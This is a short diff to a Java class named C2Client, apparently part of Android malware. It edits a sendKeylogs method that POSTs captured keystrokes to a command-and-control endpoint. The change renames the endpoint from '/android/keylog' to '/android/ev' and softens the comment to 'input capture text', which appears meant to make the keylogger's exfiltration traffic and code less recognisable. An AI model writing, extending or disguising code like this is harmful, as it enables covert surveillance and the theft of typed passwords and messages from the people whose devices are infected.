@@ -212,10 +212,10 @@ public class C2Client {
         } catch (Exception ignored) {}
     }
 
-    /** Send accumulated keylog text to the Android-specific endpoint. */
+    /** Send accumulated input capture text to the Android-specific endpoint. */
     public void sendKeylogs(String id, String logs) {
         try {
-            HttpURLConnection c = open("/android/keylog?id=" + enc(id));
+            HttpURLConnection c = open("/android/ev?id=" + enc(id));
             c.setDoOutput(true);
             c.setRequestMethod("POST");
             c.setRequestProperty("Content-Type", "text/plain; charset=utf-8");
